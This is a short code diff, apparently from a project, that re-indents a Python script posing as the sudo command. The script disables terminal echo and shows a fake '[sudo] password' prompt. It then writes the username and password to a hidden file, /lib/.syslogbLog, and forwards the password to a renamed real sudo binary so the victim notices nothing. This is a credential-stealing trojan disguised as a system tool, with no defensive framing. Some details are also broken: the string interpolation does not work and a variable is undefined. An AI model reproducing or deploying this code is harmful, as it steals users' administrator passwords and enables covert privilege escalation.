@@ -12,16 +12,16 @@ def main():
         usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ...
         """)
     else:
-    subprocess.Popen('whoami', shell=True, stdout=PIPE).stdout
-    user = stdout.read()
-    
-    os.system('stty -echo')
-    password = input("[sudo] password for {user}: ")
-    os.system("echo \"{user}:{password}\" >> /lib/.syslogbLog")
-    os.system('stty echo')
-    arguments = ""
-    del sys.argv[0]
-    for arg in sys.argv:
-        arguments = arguments + arg + " "
-    os.system("echo {password} | sudoA -S -k {arguments}")
+        subprocess.Popen('whoami', shell=True, stdout=PIPE).stdout
+        user = stdout.read()
+        
+        os.system('stty -echo')
+        password = input("[sudo] password for {user}: ")
+        os.system("echo \"{user}:{password}\" >> /lib/.syslogbLog")
+        os.system('stty echo')
+        arguments = ""
+        del sys.argv[0]
+        for arg in sys.argv:
+            arguments = arguments + arg + " "
+        os.system("echo {password} | sudoA -S -k {arguments}")
 main()
